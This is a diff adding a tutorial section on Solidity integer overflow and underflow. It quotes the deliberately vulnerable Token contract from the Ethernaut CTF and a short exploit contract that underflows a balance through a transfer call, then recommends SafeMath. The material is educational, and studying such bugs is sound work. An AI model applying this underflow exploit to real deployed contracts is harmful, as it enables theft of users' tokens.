@@ -134,3 +134,63 @@ contract Reentrance is ReentrancyGuard{
 
 Notice the inheritance `contract Reentrancy is ReentrancyGuard` and function definition `function withdraw(uint _amount) public nonReentrant`.
 
+### Arithmetic overflows and underflows
+Solidity’s 256 bits Virtual Machine (EVM) brought back overflow and underflow issues. Developers should be extra careful when using uint data types.
+You can think of a uint/int data type as a ring buffer, when the limit is exceded, it will start again from the first element(i.e. zero).
+Take a look at the following example:
+- we have a `uint _var = 0` that means it can store any integer up to 2^256 - 1. Now let's say we want to do the following operation: 
+    - `_var = _var + (2**256 - 1) + 5` will give as a value of 4 (because `0 + 2**256 - 1` will give us MAX value, but adding 5 over the max value will overflow the uint and give us 4)
+
+### Underflow example
+The following contract is taken from the [Ethernaut](https://ethernaut.openzeppelin.com) CTF, Token level:
+```solidity
+pragma solidity ^0.6.0;
+
+contract Token {
+
+  mapping(address => uint) balances;
+  uint public totalSupply;
+
+  constructor(uint _initialSupply) public {
+    balances[msg.sender] = totalSupply = _initialSupply;
+  }
+
+  function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value >= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+
+  function balanceOf(address _owner) public view returns (uint balance) {
+    return balances[_owner];
+  }
+}
+```
+
+A simple exploit for this contract could be the following:
+```solidity
+pragma solidity ^0.6.0;
+
+interface Token{
+    function transfer(address _to, uint value) external ;
+}
+
+contract TokenHacker{
+    address tokenAddress = 0x08EABfcd1a1931F3307908EeE726Aa2F4Fe1E3b0;
+    Token token;
+    
+    constructor () public {
+        token = Token(tokenAddress);
+    }
+    
+    function hack() public {
+        token.transfer(0xa447DB345C0b81aD25B83CFF30E08f6b9fdF6CA6, 50000);
+    }
+    
+}
+```
+
+### Overflow and underflow protection
+Use the [Openzeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts)'s SafeMath library to avoid underflows and overflows on your data types.
+
